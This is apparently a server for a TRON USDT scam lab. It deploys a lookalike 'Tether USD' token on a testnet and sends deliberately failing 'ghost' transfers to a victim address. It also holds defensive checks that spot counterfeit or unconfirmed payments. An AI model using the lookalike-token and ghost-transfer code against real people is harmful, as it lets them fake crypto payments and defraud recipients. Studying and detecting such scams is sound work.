const express = require('express');
const fs = require('fs');
const path = require('path');
const solc = require('solc');
const { TronWeb } = require('tronweb');

const NILE = 'https://nile.trongrid.io';
const MAINNET = 'https://api.trongrid.io';
const NILE_EXPLORER = 'https://nile.tronscan.org';
const MAIN_EXPLORER = 'https://tronscan.org';
const REAL_USDT_HEX = '41a614f803b6fd780986a42c78ec9c7f77e6ded13c'; // TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t
const DATA = '/data';
const ACCT_FILE = path.join(DATA, 'lab-account.json');
const CLONE_FILE = path.join(DATA, 'clone.json');
const WALLETS_FILE = path.join(DATA, 'wallets.json');
const GHOST_FILE = path.join(DATA, 'ghost-runs.json');
const REAL_USDT_B58 = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const ghostRuns = {}; // txid -> {timeline:[], status}
const demoRuns = {};  // txid -> {timeline:[], status}  (mainnet real transfers)
let account = null;
let clone = null;
let wallets = null;

function twWithKey() {
  return new TronWeb({ fullHost: NILE, privateKey: account.privateKey });
}
const twRead = new TronWeb({ fullHost: NILE });
const twMain = new TronWeb({ fullHost: MAINNET });

async function loadState() {
  if (fs.existsSync(ACCT_FILE)) account = JSON.parse(fs.readFileSync(ACCT_FILE, 'utf8'));
  else {
    const a = await twRead.createAccount();
    account = { address: a.address.base58, privateKey: a.privateKey };
    fs.mkdirSync(DATA, { recursive: true });
    fs.writeFileSync(ACCT_FILE, JSON.stringify(account, null, 2));
  }
  if (fs.existsSync(CLONE_FILE)) clone = JSON.parse(fs.readFileSync(CLONE_FILE, 'utf8'));
  if (fs.existsSync(WALLETS_FILE)) wallets = JSON.parse(fs.readFileSync(WALLETS_FILE, 'utf8'));
  if (fs.existsSync(GHOST_FILE)) Object.assign(ghostRuns, JSON.parse(fs.readFileSync(GHOST_FILE, 'utf8')));
}

// ---------- status ----------
app.get('/api/status', async (_req, res) => {
  try {
    const bal = Number(await twRead.trx.getBalance(account.address)) / 1e6;
    res.json({
      network: 'nile', address: account.address, trxBalance: bal,
      faucet: 'https://nileex.io/join/getJoinPage',
      clone, funded: bal > 0,
    });
  } catch (e) { res.status(500).json({ error: String(e.message || e) }); }
});

// ---------- module 2: lookalike TRC20 on Nile ----------
app.post('/api/clone', async (_req, res) => {
  try {
    if (clone) return res.json({ already: true, ...clone });
    const src = fs.readFileSync(path.join(__dirname, 'trc20.sol'), 'utf8');
    const input = {
      language: 'Solidity',
      sources: { 'trc20.sol': { content: src } },
      settings: { outputSelection: { '*': { '*': ['abi', 'evm.bytecode.object'] } } },
    };
    const out = JSON.parse(solc.compile(JSON.stringify(input)));
    if (out.errors && out.errors.some(e => e.severity === 'error'))
      return res.status(500).json({ error: out.errors.map(e => e.formattedMessage).join('\n') });
    const c = out.contracts['trc20.sol'].LookalikeToken;
    const tw = twWithKey();
    const deployed = await tw.contract().new({
      abi: c.abi,
      bytecode: c.evm.bytecode.object,
      feeLimit: 1_000_000_000,       // 1000 TRX worth of energy cap (testnet)
      userFeePercentage: 100,
      originEnergyLimit: 10_000_000,
      name: 'LookalikeToken',
      parameters: ['Tether USD', 'USDT', 6, 1_000_000], // same name/symbol/decimals
    });
    let addr = deployed.address || deployed.contract_address;
    if (addr && addr.startsWith('41')) addr = tw.address.fromHex(addr);
    clone = {
      address: addr,
      name: 'Tether USD', symbol: 'USDT', decimals: 6,
      explorer: `${NILE_EXPLORER}/contract/${addr}`,
      note: 'Different contract address — that is the entire trick.',
    };
    fs.writeFileSync(CLONE_FILE, JSON.stringify(clone, null, 2));
    res.json(clone);
  } catch (e) { res.status(500).json({ error: String(e.message || e) }); }
});

// ---------- module 1: mempool ghost lifecycle on Nile ----------
// Broadcasts a clone-token transfer with a deliberately tiny feeLimit. The tx
// is accepted into the mempool (visible as "pending" / incoming to the victim
// address), then fails execution (OUT_OF_ENERGY) — the exact flash-USDT vector.
app.post('/api/ghost', async (req, res) => {
  try {
    if (!clone) return res.status(400).json({ error: 'deploy clone token first (module 2)' });
    const victim = req.body.victim || (await twRead.createAccount()).address.base58;
    const amount = Math.floor((req.body.amount || 5000) * 1e6); // "5000 USDT"
    const tw = twWithKey();
    const contract = await tw.contract().at(clone.address);
    const txid = await contract.transfer(victim, amount).send({ feeLimit: 1 });
    const run = { txid, victim, amount: req.body.amount || 5000, timeline: [{ t: 0, event: `broadcast accepted — txid ${txid}` }], status: 'broadcast' };
    ghostRuns[txid] = run;
    fs.writeFileSync(GHOST_FILE, JSON.stringify(ghostRuns, null, 2));
    const t0 = Date.now();
    const poll = setInterval(async () => {
      const t = Math.round((Date.now() - t0) / 1000);
      try {
        const raw = await twRead.trx.getTransaction(txid).catch(() => null);
        if (raw && raw.txID && !run.seenOnNet) {
          run.seenOnNet = true;
          run.timeline.push({ t, event: 'visible on network + explorer as PENDING — wallet would show incoming' });
        }
        const info = await twRead.trx.getTransactionInfo(txid).catch(() => null);
        if (info && info.receipt) {
          const result = info.receipt.result || info.result || 'UNKNOWN';
          let msg = '';
          if (info.resMessage) {
            try { msg = Buffer.from(info.resMessage, 'hex').toString('utf8'); } catch (_) { msg = info.resMessage; }
          }
          run.status = result;
          run.timeline.push({ t, event: `executed → ${result} ${msg ? '(' + msg + ')' : ''}` });
          run.timeline.push({ t, event: 'balance moved: NONE — ghost expired, nothing ever transferred' });
          fs.writeFileSync(GHOST_FILE, JSON.stringify(ghostRuns, null, 2));
          clearInterval(poll);
        } else if (t > 90) {
          run.status = 'DROPPED';
          run.timeline.push({ t, event: 'never executed — dropped from mempool unconfirmed' });
          fs.writeFileSync(GHOST_FILE, JSON.stringify(ghostRuns, null, 2));
          clearInterval(poll);
        }
      } catch (_) {}
    }, 2000);
    res.json({ txid, victim, explorer: `${NILE_EXPLORER}/transaction/${txid}` });
  } catch (e) { res.status(500).json({ error: String(e.message || e) }); }
});

app.get('/api/ghost/:txid', (req, res) => res.json(ghostRuns[req.params.txid] || { status: 'unknown' }));

// ---------- mainnet tryout: two lab wallets, real USDT transfer ----------
// Demonstrates the wallet-UI credit vs finality gap with a REAL transaction —
// same premature display the scam exploits, minus the engineered failure.
app.post('/api/wallets', async (_req, res) => {
  try {
    if (wallets) return res.json({ already: true, A: wallets.A.address, B: wallets.B.address });
    const a = await twMain.createAccount();
    const b = await twMain.createAccount();
    wallets = {
      A: { address: a.address.base58, privateKey: a.privateKey },
      B: { address: b.address.base58, privateKey: b.privateKey },
    };
    fs.writeFileSync(WALLETS_FILE, JSON.stringify(wallets, null, 2));
    res.json({
      A: wallets.A.address, B: wallets.B.address,
      note: 'keys in /data/wallets.json — fund A with ~1 USDT + ~30 TRX (fees)',
    });
  } catch (e) { res.status(500).json({ error: String(e.message || e) }); }
});

app.get('/api/wallets', async (_req, res) => {
  try {
    if (!wallets) return res.json({ created: false });
    const usdt = await twMain.contract().at(REAL_USDT_B58);
    const [trxA, trxB, uA, uB] = await Promise.all([
      twMain.trx.getBalance(wallets.A.address).catch(() => 0),
      twMain.trx.getBalance(wallets.B.address).catch(() => 0),
      usdt.balanceOf(wallets.A.address).call().catch(() => 0),
      usdt.balanceOf(wallets.B.address).call().catch(() => 0),
    ]);
    res.json({
      created: true,
      A: { address: wallets.A.address, trx: Number(trxA) / 1e6, usdt: Number(uA) / 1e6 },
      B: { address: wallets.B.address, trx: Number(trxB) / 1e6, usdt: Number(uB) / 1e6 },
    });
  } catch (e) { res.status(500).json({ error: String(e.message || e) }); }
});

// Real 1 USDT A->B transfer with lifecycle timeline (pending -> confirmed)
app.post('/api/demo/send', async (_req, res) => {
  try {
    if (!wallets) return res.status(400).json({ error: 'create wallets first' });
    const twA = new TronWeb({ fullHost: MAINNET, privateKey: wallets.A.privateKey });
    const usdt = await twA.contract().at(REAL_USDT_B58);
    const txid = await usdt.transfer(wallets.B.address, 1_000_000).send({ feeLimit: 60_000_000 });
    const run = { txid, from: wallets.A.address, to: wallets.B.address, amount: 1,
      timeline: [{ t: 0, event: `broadcast accepted — real USDT transfer, txid ${txid}` }], status: 'broadcast' };
    demoRuns[txid] = run;
    const t0 = Date.now();
    const poll = setInterval(async () => {
      const t = Math.round((Date.now() - t0) / 1000);
      try {
        const raw = await twMain.trx.getTransaction(txid).catch(() => null);
        if (raw && raw.txID && !run.seenOnNet) {
          run.seenOnNet = true;
          run.timeline.push({ t, event: 'visible on network — wallet B already shows +1 USDT incoming (THE SCAM WINDOW)' });
        }
        const info = await twMain.trx.getTransactionInfo(txid).catch(() => null);
        if (info && info.receipt) {
          const result = info.receipt.result || 'UNKNOWN';
          run.status = result;
          run.timeline.push({ t, event: `FINALITY reached → ${result} — only NOW is the balance real` });
          clearInterval(poll);
        } else if (t > 120) { run.status = 'TIMEOUT'; clearInterval(poll); }
      } catch (_) {}
    }, 2000);
    res.json({ txid, explorer: `${MAIN_EXPLORER}/#/transaction/${txid}` });
  } catch (e) { res.status(500).json({ error: String(e.message || e) }); }
});

app.get('/api/demo/:txid', (req, res) => res.json(demoRuns[req.params.txid] || { status: 'unknown' }));

// ---------- deposit credit-check: the full gateway verification ----------
// credit=true only if EVERY check passes. This is the reference implementation
// a real gateway builds on (minus invoice bookkeeping).
const TRANSFER_TOPIC = 'ddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef';

async function creditCheck(txid, net, solHost, depositAddr, amount, realContractB58) {
  const checks = [];
  const push = (name, pass, detail) => checks.push({ name, pass, detail });

  // 1. finality: tx must be in a SOLIDIFIED block (~1min on TRON)
  const sol = await fetch(`${solHost}/walletsolidity/gettransactioninfobyid`, {
    method: 'POST', headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ value: txid }),
  }).then(r => r.json()).catch(() => ({}));
  push('solidified', !!sol.id, sol.id ? 'block solidified — final' : 'not in a solidified block — not final, cannot credit');

  // 2. execution succeeded
  const info = await net.trx.getTransactionInfo(txid).catch(() => null);
  let msg = '';
  if (info && info.resMessage) { try { msg = Buffer.from(info.resMessage, 'hex').toString('utf8'); } catch (_) {} }
  const okExec = !!(info && info.receipt && info.receipt.result === 'SUCCESS');
  push('execution', okExec, okExec ? 'SUCCESS' : `not a successful execution${msg ? ' — ' + msg : ''} (ghost/failed tx)`);

  // 3+4. per-event: real contract emitted Transfer to expected recipient+amount
  const realHex = net.address.toHex(realContractB58).replace(/^41/, '').toLowerCase();
  let matched = false; const evs = [];
  for (const l of (info && info.log) || []) {
    if (!l.topics || l.topics[0] !== TRANSFER_TOPIC) continue;
    const emitter = '41' + l.address.toLowerCase();
    const to = net.address.fromHex('41' + l.topics[2].slice(24));
    const val = parseInt(l.data, 16) / 1e6;
    const emitterB58 = net.address.fromHex(emitter);
    evs.push(`${emitterB58} → ${to} : ${val}`);
    if (l.address.toLowerCase() === realHex
        && (!depositAddr || to === depositAddr)
        && (!amount || Math.abs(val - Number(amount)) < 1e-6)) matched = true;
  }
  push('transfer_event', matched,
    matched ? 'Transfer event from REAL contract to expected address+amount'
            : `no Transfer from the real contract to ${depositAddr || 'expected address'}${evs.length ? ' — saw: ' + evs.join('; ') : ' — no Transfer events at all'}`);

  return { txid, credit: checks.every(c => c.pass), checks };
}

app.get('/api/credit-check/:txid', async (req, res) => {
  try {
    const nile = req.query.network === 'nile';
    const net = nile ? twRead : twMain;
    const solHost = nile ? NILE : MAINNET;
    const realC = nile ? (clone && clone.address) : REAL_USDT_B58;
    if (!realC) return res.status(400).json({ error: 'no reference contract on nile — deploy clone first' });
    res.json(await creditCheck(req.params.txid, net, solHost, req.query.for, req.query.amount, realC));
  } catch (e) { res.status(500).json({ error: String(e.message || e) }); }
});

// ---------- attack suite: fire real + simulated attack txs at credit-check ----------
// Every test must produce credit=false EXCEPT the positive control.
// Mainnet attack samples are REAL scammer txs found in the wild (read-only).
async function txInfo(host, txid) {
  return fetch(`${host}/wallet/gettransactioninfobyid`, {
    method: 'POST', headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ value: txid }),
  }).then(r => r.json()).catch(() => ({}));
}

async function findMainnetAttackSamples() {
  const out = {};
  // counterfeit USDT: tronscan token search for name=USDT, take a contract != real
  try {
    const toks = await fetch('https://apilist.tronscanapi.com/api/token_trc20?sort=0&limit=40&start=0&name=USDT').then(r => r.json());
    const fakes = (toks.trc20_tokens || []).filter(t => t.contract_address !== REAL_USDT_B58);
    outer: for (const f of fakes.slice(0, 10)) {
      const txs = await fetch(`${MAINNET}/v1/contracts/${f.contract_address}/transactions?limit=5`).then(r => r.json()).catch(() => ({}));
      for (const t of (txs.data || [])) {
        if (!(t.ret && t.ret[0] && t.ret[0].contractRet === 'SUCCESS')) continue;
        const info = await txInfo(MAINNET, t.txID); // require an actual Transfer event
        if ((info.log || []).some(l => l.topics && l.topics[0] === TRANSFER_TOPIC)) {
          out.counterfeit = { contract: f.contract_address, name: f.name, symbol: f.symbol, txid: t.txID };
          break outer;
        }
      }
    }
  } catch (_) {}
  // failed real-USDT tx (the ghost pattern — exists in the wild constantly)
  try {
    const txs = await fetch(`${MAINNET}/v1/contracts/${REAL_USDT_B58}/transactions?limit=60`).then(r => r.json());
    const failed = (txs.data || []).find(t => t.ret && t.ret[0] && t.ret[0].contractRet !== 'SUCCESS');
    if (failed) out.failed = { txid: failed.txID };
    const old = Date.now() - 5 * 60 * 1000; // need a solidified tx, not a fresh one
    const ok = (txs.data || []).find(t => t.ret && t.ret[0] && t.ret[0].contractRet === 'SUCCESS'
      && Number(t.block_timestamp) < old);
    if (ok) out.wrongRecipient = { txid: ok.txID };
  } catch (_) {}
  return out;
}

app.post('/api/attack-suite', async (_req, res) => {
  try {
    const results = [];
    const deposit = wallets ? wallets.B.address : 'TTestDepositAddress0000000000';
    const run = async (label, net, solHost, txid, realC, expectCredit, opts = {}) => {
      const r = await creditCheck(txid, net, solHost, opts.for !== undefined ? opts.for : deposit, opts.amount, realC);
      results.push({ label, txid, expected: expectCredit, got: r.credit, pass: r.credit === expectCredit, checks: r.checks });
    };

    // --- testnet attacks (we control these) ---
    if (clone) {
      const ghostTxid = Object.keys(ghostRuns).find(t => ghostRuns[t].status === 'OUT_OF_ENERGY');
      if (ghostTxid) await run('TESTNET ghost (starved energy, dies)', twRead, NILE, ghostTxid, clone.address, false);
      // counterfeit test on nile: a second lookalike would be needed; skip — mainnet covers it
    }

    // --- mainnet attacks (real scammer txs, read-only) ---
    const samples = await findMainnetAttackSamples();
    if (samples.counterfeit)
      await run('MAINNET counterfeit "USDT" transfer', twMain, MAINNET, samples.counterfeit.txid, REAL_USDT_B58, false, { for: null });
    if (samples.failed)
      await run('MAINNET failed USDT tx (ghost pattern)', twMain, MAINNET, samples.failed.txid, REAL_USDT_B58, false);
    if (samples.wrongRecipient)
      await run('MAINNET real USDT to WRONG recipient', twMain, MAINNET, samples.wrongRecipient.txid, REAL_USDT_B58, false);
    // positive control: our real demo transfer if it ran
    const demoTxid = Object.keys(demoRuns).find(t => demoRuns[t].status === 'SUCCESS');
    if (demoTxid) await run('POSITIVE CONTROL real 1 USDT to deposit', twMain, MAINNET, demoTxid, REAL_USDT_B58, true, { amount: 1 });

    res.json({ deposit, samples, results,
      summary: `${results.filter(r => r.pass).length}/${results.length} attacks correctly handled` });
  } catch (e) { res.status(500).json({ error: String(e.message || e) }); }
});

// ---------- module 3: defensive verifier (mainnet, read-only) ----------
// The artifact that DETECTS the scam: given a txid, report finality + contract
// authenticity. A "flash" tx is always NOT_FOUND, FAILED, or wrong contract.
app.get('/api/verify/:txid', async (req, res) => {
  try {
    const net = req.query.network === 'nile' ? twRead : twMain;
    const explorer = req.query.network === 'nile' ? NILE_EXPLORER : MAIN_EXPLORER;
    const txid = req.params.txid;
    const tx = await net.trx.getTransaction(txid).catch(() => null);
    const info = await net.trx.getTransactionInfo(txid).catch(() => null);
    let contractHex = null;
    try { contractHex = tx.raw_data.contract[0].parameter.value.contract_address || null; } catch (_) {}
    const contractB58 = contractHex ? net.address.fromHex(contractHex) : null;

    let verdict, detail;
    if (!tx) {
      verdict = 'NOT_ON_CHAIN';
      detail = 'No such transaction on the network — it was never broadcast or already dropped. Classic flash state.';
    } else if (!info || !info.receipt) {
      verdict = 'PENDING_UNCONFIRMED';
      detail = 'Visible but unconfirmed — sitting in mempool. Can still vanish. Do NOT treat as payment.';
    } else {
      const result = info.receipt.result || 'UNKNOWN';
      let msg = '';
      if (info.resMessage) {
        try { msg = Buffer.from(info.resMessage, 'hex').toString('utf8'); } catch (_) { msg = info.resMessage; }
      }
      if (result !== 'SUCCESS') {
        verdict = 'FAILED';
        detail = `Execution failed (${msg || result}) — ghost tx. The displayed balance never existed.`;
      } else if (contractHex && contractHex.toLowerCase() === REAL_USDT_HEX) {
        verdict = 'REAL_USDT';
        detail = 'Confirmed transfer on the genuine Tether TRC-20 contract.';
      } else {
        verdict = 'COUNTERFEIT_TOKEN';
        detail = `Confirmed, but token contract ${contractB58} is NOT real USDT — lookalike by name/symbol only.`;
      }
    }
    res.json({ txid, verdict, detail, contract: contractB58, explorer: `${explorer}/#/transaction/${txid}` });
  } catch (e) { res.status(500).json({ error: String(e.message || e) }); }
});

// ---------- watch: flag incoming lookalike "USDT" to an address (mainnet) ----------
app.get('/api/watch/:address', async (req, res) => {
  try {
    const url = `https://api.trongrid.io/v1/accounts/${req.params.address}/transactions/trc20?limit=20&only_to=true`;
    const r = await fetch(url).then(x => x.json());
    const items = (r.data || []).map(t => ({
      txid: t.transaction_id,
      symbol: t.token_info?.symbol,
      name: t.token_info?.name,
      contract: t.token_info?.address,
      value: Number(t.value) / 10 ** (t.token_info?.decimals || 6),
      real: (t.token_info?.address || '').toLowerCase() === REAL_USDT_HEX.toLowerCase()
            || t.token_info?.address === 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
    }));
    res.json({ count: items.length, suspicious: items.filter(i => !i.real), items });
  } catch (e) { res.status(500).json({ error: String(e.message || e) }); }
});

loadState().then(() => app.listen(8080, () => console.log('usdt-lab on :8080 — account', account.address)));
